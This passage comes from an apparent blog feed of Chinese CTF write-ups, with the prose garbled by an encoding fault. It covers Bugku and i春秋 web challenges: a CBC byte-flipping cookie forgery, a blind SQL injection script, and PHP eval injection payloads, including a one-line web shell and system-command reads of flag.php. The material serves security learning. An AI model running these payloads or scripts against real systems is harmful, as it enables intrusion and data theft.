//éšæœºç”Ÿæˆ16ä½åˆå§‹åŒ–å‘é‡    $random_iv='';    for($i=0;$i&lt;16;$i++){        $random_iv.=chr(rand(1,255));    }    return $random_iv;}#ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„æ–¹æ³•function login($info){    $iv = get_random_iv();    $plain = serialize($info);    //æ˜Žæ–‡åºåˆ—åŒ–    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    //åŠ å¯†    //optionsï¼šä»¥ä¸‹æ ‡è®°çš„æŒ‰ä½æˆ–ï¼š OPENSSL_RAW_DATA åŽŸç”Ÿæ•°æ®ï¼Œå¯¹åº”æ•°å­—1ï¼Œä¸è¿›è¡Œ base64 ç¼–ç ã€‚OPENSSL_ZERO_PADDING æ•°æ®è¿›è¡Œ base64 ç¼–ç å†è¿”å›žï¼Œå¯¹åº”æ•°å­—0ã€‚     $_SESSION['username'] = $info['username'];    //æ³¨å†ŒSESSIONå…¨å±€å˜é‡    //ä»¥ä¸‹ä¸¤è¡Œè®¾ç½®cookie    setcookie("iv", base64_encode($iv));    setcookie("cipher", base64_encode($cipher));}function check_login(){    if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv'])){        $cipher = base64_decode($_COOKIE['cipher']);        $iv = base64_decode($_COOKIE["iv"]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;");            $_SESSION['username'] = $info['username'];        }else{            die("ERROR!");        }    }}#ç¬¬äºŒä¸ªæ‰§è¡Œï¼Œæ£€æµ‹ç”¨æˆ·åä¸ºadminæ—¶ï¼Œæ‰“å°flagfunction show_homepage(){    if ($_SESSION["username"]==='admin'){        echo '&lt;p&gt;Hello admin&lt;/p&gt;';        echo '&lt;p&gt;Flag is $flag&lt;/p&gt;';    }else{        echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;';        echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;';    }    echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';}if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){    $username = (string)$_POST['username'];    $password = (string)$_POST['password'];    if($username === 'admin'){        exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;');    }else{        $info = array('username'=&gt;$username,'password'=&gt;$password);        login($info);        show_homepage();    }}else{    if(isset($_SESSION["username"])){        check_login();        show_homepage();    }else{        echo '&lt;body class="login-body"&gt;                &lt;div id="wrapper"&gt;                    &lt;div class="user-icon"&gt;&lt;/div&gt;                    &lt;div class="pass-icon"&gt;&lt;/div&gt;                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;                        &lt;div class="header"&gt;                        &lt;h1&gt;Login Form&lt;/h1&gt;                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;                        &lt;/div&gt;                        &lt;div class="content"&gt;                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;                        &lt;/div&gt;</code></pre><p>POSTå‚æ•°(username,password)ï¼Œå¹¶ä¸”ç¦æ­¢adminç™»é™†ã€‚å½“ç”¨æˆ·åä¸æ˜¯adminçš„æ—¶å€™ï¼Œé¦–å…ˆæŠŠç”¨æˆ·åå¯†ç æ”¾å…¥æ•°ç»„ï¼Œä¼ åˆ°loginæ–¹æ³•ä¸­ã€‚<br>loginæ–¹æ³•å¯¹ä¼ å…¥çš„æ•°ç»„è¿›è¡Œäº†åºåˆ—åŒ–ï¼Œå¹¶ä¸”ä½¿ç”¨aes-128-cbcå¯¹åºåˆ—åŒ–è¿›è¡ŒåŠ å¯†ã€‚iv(åˆå§‹åŒ–å‘é‡)æ˜¯éšæœºç”Ÿæˆçš„ã€‚æœ€ç»ˆæŠŠcipherå’Œivæ”¾å…¥cookieã€‚<br>å†åˆ°show_homepage()æ–¹æ³•ï¼Œæ£€æµ‹$<em>SESSIONä¸­çš„usernameæ˜¯adminæ—¶ï¼Œæ‰“å°flagã€‚å¦åˆ™æç¤ºOnly admin can see flag</em></p><p>ç„¶åŽå®¡è®¡elseçš„ä¸‹åŠéƒ¨åˆ†ï¼Œè¿™é‡Œæ˜¯ä¸ŠåŠéƒ¨åˆ†æ“ä½œæ‰§è¡Œè¿‡åŽï¼Œå­˜åœ¨$_SESSION[â€˜usernameâ€™]æ—¶æ‰§è¡Œã€‚å½“ä¸å­˜åœ¨POSTæ•°æ®æˆ–è€…$_SESSION[â€˜usernameâ€™]æ—¶ï¼Œæ˜¾ç¤ºç™»é™†é¡µé¢ã€‚<br>æœ‰$_SESSION[â€˜usernameâ€™]æ—¶ï¼Œè¿›å…¥check_login()æ–¹æ³•ã€‚<br>å½“cookieä¸­å­˜åœ¨cipherã€ivæ—¶ï¼Œå¯¹cipherè¿›è¡Œè§£å¯†ã€‚è¿™é‡Œæ˜¯è§£é¢˜çš„å…³é”®ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹cookieä¸­çš„cipherå€¼ï¼Œå°†åºåˆ—åŒ–æ•°æ®çš„ç”¨æˆ·åä¿®æ”¹æˆadminã€‚ä»Žè€Œç»•è¿‡ç¨‹åºèµ·ç‚¹å¤„ç¦æ­¢adminç™»é™†çš„åˆ¤æ–­ã€‚</p><h3 id="æ³•ä¸€ï¼š"><a href="#æ³•ä¸€ï¼š" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h3><ol><li>send to repeaterä»¥åŽgo</li><li>åˆ é™¤postå†…å®¹</li><li>å°†cipherçš„å€¼ä»£å…¥ç¨‹åº</li></ol><pre><code>&lt;?phpheader("Content-Type: text/html;charset=utf-8");    $cipher = base64_decode(urldecode('1bwcTEFquw2kLy3UGhW3OOw%2Bkof9%2BjH2XhiKvkVuzqmndIOd9fBXLB82Q3hbM7LCx8ySoty36X8pOIOylkSkkg%3D%3D'));    $temp = $cipher;    $cipher[13] = chr(ord($cipher[13]) ^ ord('l') ^ ord('n'));    echo urlencode(base64_encode($cipher));    ?&gt;</code></pre><ol start="4"><li><p>æ›¿æ¢cookiesé‡Œçš„cipher</p><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugkuï¼šWeb39-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\base64è§£ç .png" alt="base64è§£ç "></p><p>base64è§£ç ä»¥åŽå¯ä»¥çœ‹åˆ°admilå·²ç»æ›¿æ¢æˆadmin</p></li><li><p>å›žæ˜¾base64å’Œivä»£å…¥ç¨‹åº</p></li></ol><pre><code>&lt;?php    $res = base64_decode('xaJllZwcE1Rh7Z0ieT8WV21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==');    //è¿™é‡Œæ”¾burpæ”¾å›žçš„base64æ•°æ®    $iv = base64_decode(urldecode('FIbK%2FCXr43MhcD7KRPnlaA%3D%3D'));     $plaintext = 'a:2:{s:8:"userna';    $new_iv = '';    for ($i = 0; $i &lt; 16; $i ++){        $new_iv = $new_iv . chr(ord($iv[$i]) ^ ord($res[$i]) ^ ord($plaintext[$i]));    }    echo urlencode(base64_encode($new_iv));?&gt;</code></pre><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugkuï¼šWeb39-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\localhost2.php.png" alt="localhost2.php"></p><ol start="6"><li>ç”¨è¾“å‡ºivçš„å€¼æ›¿æ¢cookiesé‡Œçš„iv</li></ol><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugkuï¼šWeb39-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web36-å„ç§è¿‡æ»¤</title>
      <link href="2021/04/11/bugku-web36-ge-chong-guo-lu/"/>
      <url>2021/04/11/bugku-web36-ge-chong-guo-lu/</url>
      
        <content type="html"><![CDATA[<pre><code># -*- coding: utf-8 -*-import requestssession = requests.Session()url="http://114.67.246.176:12012/login.php"flag=''for i in range(1,250):        left=32        right=128        mid=(left+right)//2        while(left&lt;right):                payload="admin'^((ascii(mid((select(group_concat(passwd)))from(%s)))&gt;%s))^'1"%(i,mid)                data = {'uname': payload, 'passwd': 'admin'}                res = requests.post(url, data=data)                if 'password' in res.text:                        left=mid+1                else:                        right=mid                mid=(left+right)//2        if(mid==32 or mid==127):                break        flag=flag+chr(mid)        print(flag)</code></pre><p>çŒœæµ‹æ˜¯md5ï¼ŒåŽ»è§£ç å¾—åˆ°<code>bugkuctf</code></p><pre><code>cat&lt;/flag</code></pre><pre><code>{cat,/flag}</code></pre><p><img src="/2021/04/11/bugku-web36-ge-chong-guo-lu/blog/source_posts\Bugkuï¼šWeb36-å„ç§è¿‡æ»¤\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web33-è§£ç </title>
      <link href="2021/04/09/bugku-web33-jie-ma/"/>
      <url>2021/04/09/bugku-web33-jie-ma/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?phpfunction encrypt($data,$key){    $key = md5('ISCC'); #729623334f0aa2784a1599fd374c120d    $x = 0;    $len = strlen($data);    $klen = strlen($key);    for ($i=0; $i &lt; $len; $i++) {         if ($x == $klen)        {            $x = 0;        }        $char .= $key[$x];        $x+=1;    }    for ($i=0; $i &lt; $len; $i++) {        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);    }    return base64_encode($str);}?&gt;</code></pre><pre><code>æã€€ã€€è¿°: fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</code></pre><p>éœ€è¦å¯¹æè¿°å­—ç¬¦ä¸²è§£å¯†ï¼Œè§£å¯†å‡½æ•°å¦‚ä¸‹</p><pre><code>&lt;?phpfunction decrypt($str) {    $mkey = "729623334f0aa2784a1599fd374c120d";    $klen = strlen($mkey);    $tmp = $str;    $tmp = base64_decode($tmp);  // å¯¹ base64 åŽçš„å­—ç¬¦ä¸² decode    $md_len = strlen($tmp); //èŽ·å–å­—ç¬¦ä¸²é•¿åº¦    $x = 0;    $char = "";    for($i=0;$i &lt; $md_len;$i++) {  //  å–äºŒæ¬¡åŠ å¯†ç”¨ key;        if ($x == $klen)  // æ•°æ®é•¿åº¦æ˜¯å¦è¶…è¿‡ key é•¿åº¦æ£€æµ‹            $x = 0;        $char .= $mkey[$x];  // ä»Ž key ä¸­å–äºŒæ¬¡åŠ å¯†ç”¨ key        $x+=1;    }    $md_data = array();    for($i=0;$i&lt;$md_len;$i++) { // å–åç§»åŽå¯†æ–‡æ•°æ®        array_push($md_data, ord($tmp[$i]));    }    $md_data_source = array();    $data1 = "";    $data2 = "";    foreach ($md_data as $key =&gt; $value) { // å¯¹åç§»åŽçš„å¯†æ–‡æ•°æ®è¿›è¡Œè¿˜åŽŸ        $i = $key;        if($i &gt;= strlen($mkey)) {$i = $i - strlen($mkey);}        $dd = $value;        $od = ord($mkey[$i]);        array_push($md_data_source,$dd);        $data1 .= chr(($dd+128)-$od);  // ç¬¬ä¸€ç§å¯èƒ½, ä½™æ•°+128-key ä¸ºå›žå½’æ•°        $data2 .= chr($dd-$od);  // ç¬¬äºŒç§å¯èƒ½, ä½™æ•°ç›´æŽ¥-key ä¸ºå›žå½’æ•°    }    print "data1 =&gt; ".$data1."&lt;br&gt;\n";    print "data2 =&gt; ".$data2."&lt;br&gt;\n";}$str = "fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=";decrypt($str);?&gt;</code></pre><p><img src="/2021/04/09/bugku-web33-jie-ma/blog/source_posts\Bugkuï¼šWeb33-è§£ç \åœ¨çº¿è§£ç .png" alt="åœ¨çº¿è§£ç "></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:MiscWeb-çˆ†ç ´</title>
      <link href="2021/04/07/i-chun-qiu-miscweb-bao-po/"/>
      <url>2021/04/07/i-chun-qiu-miscweb-bao-po/</url>
      
        <content type="html"><![CDATA[<h2 id="çˆ†ç ´-1"><a href="#çˆ†ç ´-1" class="headerlink" title="çˆ†ç ´-1"></a>çˆ†ç ´-1</h2><h4 id="é¢˜ç›®å†…å®¹"><a href="#é¢˜ç›®å†…å®¹" class="headerlink" title="é¢˜ç›®å†…å®¹"></a>é¢˜ç›®å†…å®¹</h4><p>flagåœ¨6ä½å˜é‡ä¸­</p><pre><code>&lt;?phpinclude "flag.php";$a = @$_REQUEST['hello'];//ä»¥getæˆ–postä¼ å…¥helloï¼Œå¹¶èµ‹å€¼ç»™`$a`if(!preg_match('/^\w*$/',$a )){//æ­£åˆ™è¡¨è¾¾å¼^åŒ¹é…ä¸€è¡Œçš„å¼€å¤´ï¼Œ$è¡¨ç¤ºç»“æŸã€‚\wè¡¨ç¤ºåŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿çš„ä»»ä½•å•è¯å­—ç¬¦ï¼Œç­‰ä»·äºŽ'[A-Za-z0-9_]'ã€‚*å·ï¼šåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚  die('ERROR');}eval("var_dump($$a);");show_source(__FILE__);//__FILE__å½“å‰è¿è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚?&gt;</code></pre><p>1ã€å¦‚æžœåŒ¹é…æ­£åˆ™è¡¨è¾¾å¼/^\w*$/ï¼Œå°±æ‰“å°å˜é‡ $$a<br>2ã€$aæ˜¯helloï¼Œ$$aæ˜¯å…­ä½å˜é‡$hello<br>æŽ¥ä¸‹æ¥ä¸ä¼šäº†ï¼Œæ‰€ä»¥ç™¾åº¦ä¸€ä¸‹<br>å‘çŽ°è¶…å…¨å±€å˜é‡$GLOBALS<br>ä½œç”¨ï¼š<br>å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ã€‚è¿™æ ·å°±ä¼šæ‰“å°å‡ºå½“å‰å®šä¹‰çš„æ‰€æœ‰å˜é‡ï¼Œä¹ŸåŒ…æ‹¬ include çš„æ–‡ä»¶ä¸­çš„å˜é‡ï¼Œflag ä¹Ÿå­˜åœ¨åœ¨è¿™äº›å˜é‡ä¸­ã€‚<br>3ã€æ‰€ä»¥åœ¨URLåŽåŠ ?hello=GLOBALSï¼Œå°†å‚æ•°helloä¿®æ”¹ä¸ºGlobalså®žé™…æ‰§è¡Œè¯­å¥ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$a);"</span><span class="token punctuation">)</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($hello);"</span><span class="token punctuation">)</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($GLOBALS);"</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°flag</p><h2 id="çˆ†ç ´-2"><a href="#çˆ†ç ´-2" class="headerlink" title="çˆ†ç ´-2"></a>çˆ†ç ´-2</h2><h4 id="é¢˜ç›®å†…å®¹-1"><a href="#é¢˜ç›®å†…å®¹-1" class="headerlink" title="é¢˜ç›®å†…å®¹"></a>é¢˜ç›®å†…å®¹</h4><p>flagä¸åœ¨å˜é‡ä¸­</p><h4 id="æ³•ä¸€ï¼šèšå‰‘è¿žæŽ¥"><a href="#æ³•ä¸€ï¼šèšå‰‘è¿žæŽ¥" class="headerlink" title="æ³•ä¸€ï¼šèšå‰‘è¿žæŽ¥"></a>æ³•ä¸€ï¼šèšå‰‘è¿žæŽ¥</h4><pre><code>?hello=${@eval($_POST[1])</code></pre><p>è®¿é—®flag.php</p><h4 id="æ³•äºŒï¼šåˆ©ç”¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°"><a href="#æ³•äºŒï¼šåˆ©ç”¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°" class="headerlink" title="æ³•äºŒï¼šåˆ©ç”¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°"></a>æ³•äºŒï¼šåˆ©ç”¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</h4><h5 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h5><p><a href="http://php.net/manual/en/function.file.php"><code>file()</code></a> å‡½æ•°ç”¨äºŽå°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥æ•°ç»„ä¸­ã€‚</p><p>å°è¯•æž„é€  payload </p><pre><code>?hello=file("flag.php")</code></pre><p>æäº¤åŽç›´æŽ¥çœ‹åˆ° flagï¼Œè¯æ˜ŽæŽ¨æµ‹æ­£ç¡®</p><p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\iæ˜¥ç§‹ï¼šMiscWeb-çˆ†ç ´\hello=file(flag.php).png" alt="hello=file(flag.php)"></p><h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p><a href="http://php.net/manual/en/function.file-get-contents.php"><code>file_get_contents()</code></a> å‡½æ•°ç”¨äºŽå°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p><p>å°è¯•æž„é€  payload</p><pre><code>?hello=file_get_contents("flag.php")</code></pre><p>æäº¤åŽç«Ÿæœªæ˜¾ç¤º flagï¼Ÿè¿™æ˜¯å› ä¸º flag.php æ–‡ä»¶ä¸­çš„å†…å®¹ä»¥ç•Œå®šç¬¦ <code>&lt;?php</code> å¼€å¤´ï¼Œæ‰€ä»¥è¾“å‡ºåˆ°æµè§ˆå™¨æ—¶ï¼Œè¯¥å­—ç¬¦ä¸²è¢«å½“åš PHP è„šæœ¬ä¸äºˆæ˜¾ç¤ºã€‚ä½†ä¸å¿…æ‹…å¿ƒï¼Œå³å‡»é¡µé¢ç©ºç™½å¤„ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå³å¯çœ‹åˆ° flagï¼š</p><p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\iæ˜¥ç§‹ï¼šMiscWeb-çˆ†ç ´\hello=file_get_contents(flag.php).png" alt="hello=file_get_contents(flag.php)"></p><h5 id="show-source"><a href="#show-source" class="headerlink" title="show_source()"></a>show_source()</h5><p><a href="http://php.net/manual/en/function.show-source.php"><code>show_source()</code></a> å‡½æ•°ç­‰åŒäºŽ <a href="http://php.net/manual/en/function.highlight-file.php"><code>highlight_file()</code></a> å‡½æ•°ï¼Œå¯å°†ä¸€ä¸ª PHP è„šæœ¬æ–‡ä»¶è¯­æ³•é«˜äº®ã€‚</p><p>å°è¯•æž„é€  payload </p><pre><code>?hello=show_source("flag.php")</code></pre><p>æäº¤åŽèƒ½çœ‹åˆ°è¯­æ³•é«˜äº®åŽçš„ flagï¼š</p><p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\iæ˜¥ç§‹ï¼šMiscWeb-çˆ†ç ´\hello=show_source(flag.php).png" alt="hello=show_source(flag.php)"></p><h5 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h5><p><a href="http://php.net/manual/en/function.readfile.php"><code>readfile()</code></a> å‡½æ•°ç”¨äºŽè¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</p><p>åœ¨æäº¤ payload </p><pre><code>?hello=readfile("flag.php")</code></pre><p> åœ¨ç½‘é¡µæºä»£ç å¤„å¯çœ‹åˆ° flag</p><h5 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h5><p><a href="http://php.net/manual/en/function.fread.php"><code>fread()</code></a> å‡½æ•°ç”¨äºŽè¯»å–äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸è¿‡é¦–å…ˆå¾—ç”¨ <a href="http://php.net/manual/en/function.fopen.php"><code>fopen()</code></a> å‡½æ•°åˆ›å»ºæ–‡ä»¶å¥æŸ„ï¼Œå¡«å…¥ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¹¶åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¸­å¡«å…¥å¯è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚</p><p>å› æ­¤ï¼Œæž„é€  payload </p><pre><code>?hello=fread(fopen("flag.php","r"),100)</code></pre><p>åœ¨ç½‘é¡µæºä»£ç å¤„å¯çœ‹åˆ° flag</p><h4 id="æ³•ä¸‰ï¼šåˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#æ³•ä¸‰ï¼šåˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="æ³•ä¸‰ï¼šåˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>æ³•ä¸‰ï¼šåˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°</h4><p>åˆ©ç”¨ PHP ä¸­çš„<a href="http://php.net/manual/en/ref.exec.php">å‘½ä»¤æ‰§è¡Œå‡½æ•°</a>ï¼Œé€šè¿‡æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä»¥æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚</p><p>é¦–å…ˆï¼Œç”±é¢„å®šä¹‰å¸¸é‡ <a href="http://php.net/manual/en/reserved.constants.php"><code>PHP_OS</code></a> å¯çŸ¥åŽå°æ“ä½œç³»ç»Ÿçš„ç±»åž‹ï¼Œæž„é€  </p><pre><code>?hello=PHP_OS</code></pre><p> æäº¤åŽï¼Œå‘çŽ°æ˜¯ Linux æ“ä½œç³»ç»Ÿï¼š</p><p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\iæ˜¥ç§‹ï¼šMiscWeb-çˆ†ç ´\hello=PHP_OS.png" alt="hello=PHP_OS"></p><h5 id="æ‰§è¡Œè¿ç®—ç¬¦"><a href="#æ‰§è¡Œè¿ç®—ç¬¦" class="headerlink" title="æ‰§è¡Œè¿ç®—ç¬¦"></a>æ‰§è¡Œè¿ç®—ç¬¦</h5><p>PHP çš„<a href="http://php.net/manual/en/language.operators.execution.php">æ‰§è¡Œè¿ç®—ç¬¦</a>ä¸ºåå¼•å·ã€Œ`ã€ï¼Œå¯å°†åå¼•å·ä¹‹é—´çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ‰§è¡Œï¼Œå¹¶è¿”å›žæ‰€æœ‰æ‰§è¡Œç»“æžœã€‚</p><p>åœ¨æž„é€  payload ä¹‹å‰ï¼Œéœ€è¦åšä¸¤ä»¶äº‹ï¼š</p><ul><li>é—­åˆå‰é¢çš„ <code>var_dump(</code> å­—ç¬¦ä¸²ã€‚</li><li>æ³¨é‡ŠåŽé¢çš„ <code>);</code> å­—ç¬¦ä¸²ã€‚</li></ul><p>å› æ­¤ï¼Œæž„é€  payload </p><pre><code>hello=);echo `cat flag.php`;//</code></pre><p>åœ¨ç½‘é¡µæºä»£ç å¤„å³å¯çœ‹åˆ° flag</p><h5 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h5><p><a href="http://php.net/manual/en/function.system.php"><code>system()</code></a> å‡½æ•°ç”¨äºŽæ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œè¾“å‡ºæ‰§è¡Œç»“æžœï¼Œå¹¶è¿”å›žç»“æžœçš„æœ€åŽä¸€è¡Œã€‚</p><p>å› æ­¤ï¼Œåœ¨æäº¤ payload </p><pre><code>hello=);echo system("cat flag.php");//</code></pre><p>åœ¨ç½‘é¡µæºä»£ç å¤„å¯çœ‹åˆ°ä¸¤ä¸ª flagï¼Œæ˜¯å› ä¸ºç¬¬ä¸€ä¸ª flag æ˜¯ç”±è¾“å‡ºç»“æžœè€Œå¾—ï¼Œç¬¬äºŒä¸ª flag æ˜¯ç”±è¿”å›žå€¼è€Œå¾—</p><h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><p><a href="http://php.net/manual/en/function.exec.php"><code>exec()</code></a> å‡½æ•°ç”¨äºŽæ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åºï¼Œå¹¶è¿”å›žç»“æžœçš„æœ€åŽä¸€è¡Œã€‚</p><p>å› æ­¤ï¼Œåœ¨æäº¤ payload </p><pre><code>hello=);echo exec("cat flag.php");//</code></pre><p>å¯è§ flagï¼Œå› æ­¤ flag æ­£å¥½æ˜¯ flag.php æ–‡ä»¶ä¸­çš„æœ€åŽä¸€è¡Œï¼š</p><h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h5><p><a href="http://php.net/manual/en/function.shell-exec.php"><code>shell_exec()</code></a> å‡½æ•°å¯é€šè¿‡ shell çŽ¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶è¿”å›žæ‰€æœ‰æ‰§è¡Œç»“æžœï¼Œæœ¬å‡½æ•°åŠŸèƒ½ä¸Žæ‰§è¡Œè¿ç®—ç¬¦ç›¸åŒã€‚</p><p>å› æ­¤ï¼Œæž„é€  payload </p><pre><code>hello=);echo shell_exec("cat flag.php");//</code></pre><p>åœ¨ç½‘é¡µæºä»£ç å¤„å³å¯çœ‹åˆ° flag</p><h5 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h5><p><a href="http://php.net/manual/en/function.passthru.php"><code>passthru()</code></a> å‡½æ•°ç”¨äºŽæ‰§è¡Œå¤–éƒ¨å‡½æ•°ï¼Œå¹¶è¾“å‡ºåŽŸå§‹æ‰§è¡Œç»“æžœï¼Œæ²¡æœ‰è¿”å›žå€¼ã€‚</p><p>å› æ­¤ï¼Œæž„é€  payload </p><pre><code>hello=);echo passthru("cat flag.php");//</code></pre><p>åœ¨ç½‘é¡µæºä»£ç å¤„å³å¯çœ‹åˆ° flag</p><h5 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h5><p><a href="http://php.net/manual/en/function.popen.php"><code>popen()</code></a> å‡½æ•°ç”¨äºŽåˆ›å»ºæŒ‡å‘å‘½ä»¤æ‰§è¡Œè¿›ç¨‹çš„æ–‡ä»¶å¥æŸ„ï¼Œä¸Ž <code>fopen()</code> å‡½æ•°ç±»ä¼¼ï¼Œæœ€åŽå°†é€šè¿‡ <code>fread()</code> å‡½æ•°è¯»å–å‘½ä»¤æ‰§è¡Œçš„ç»“æžœã€‚</p><p>å› æ­¤ï¼Œæž„é€  payload </p><p>hello=);echo fread(popen(â€œcat flag.phpâ€,â€râ€),100);//</p><p>åœ¨ç½‘é¡µæºä»£ç å¤„å³å¯çœ‹åˆ° flagï¼š</p><h2 id="çˆ†ç ´-3"><a href="#çˆ†ç ´-3" class="headerlink" title="çˆ†ç ´-3"></a>çˆ†ç ´-3</h2><pre><code>&lt;?php error_reporting(0);session_start();require('./flag.php');if(!isset($_SESSION['nums'])){  $_SESSION['nums'] = 0;  $_SESSION['time'] = time();  $_SESSION['whoami'] = 'ea';}if($_SESSION['time']+120&lt;time()){  session_destroy();}$value = $_REQUEST['value'];$str_rand = range('a', 'z');$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];if($_SESSION['whoami']==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0){  $_SESSION['nums']++;  $_SESSION['whoami'] = $str_rands;  echo $str_rands;}if($_SESSION['nums']&gt;=10){  echo $flag;}show_source(__FILE__);?&gt;</code></pre><h4 id="é¢˜ç›®å†…å®¹ï¼š"><a href="#é¢˜ç›®å†…å®¹ï¼š" class="headerlink" title="é¢˜ç›®å†…å®¹ï¼š"></a>é¢˜ç›®å†…å®¹ï¼š</h4><p>è¿™ä¸ªçœŸçš„æ˜¯çˆ†ç ´ã€‚</p><h4 id="å®¡è®¡ä»£ç ï¼š"><a href="#å®¡è®¡ä»£ç ï¼š" class="headerlink" title="å®¡è®¡ä»£ç ï¼š"></a>å®¡è®¡ä»£ç ï¼š</h4><p>1ã€Sessionä¸­çš„numåˆå§‹å€¼ä¸º0ï¼Œtimeä¸ºå½“å‰æ—¶é—´ï¼Œwhoamiåˆå§‹å€¼ä¸ºeaã€‚<br>2ã€120ç§’ä¹‹åŽä¼šè¯ç»“æŸã€‚ç„¶åŽstr_randséšæœºç”Ÿæˆ2ä¸ªå­—æ¯ã€‚<br>3ã€whoamiéœ€è¦ç­‰äºŽä¼ é€’çš„valueå€¼çš„å‰ä¸¤ä½ï¼Œå¹¶ä¸”valueçš„md5å€¼çš„ç¬¬5ä¸ºå¼€å§‹ï¼Œé•¿åº¦ä¸º4çš„å­—ç¬¦ä¸²==0ï¼Œè¿™æ ·num++ã€‚<br>4ã€whoami=str_randsï¼Œå¾ªçŽ¯10æ¬¡åŽï¼Œè¾“å‡ºflagã€‚</p><p>æ‰€ä»¥åªè¦ç¬¬ä¸€æ¬¡ä¼ 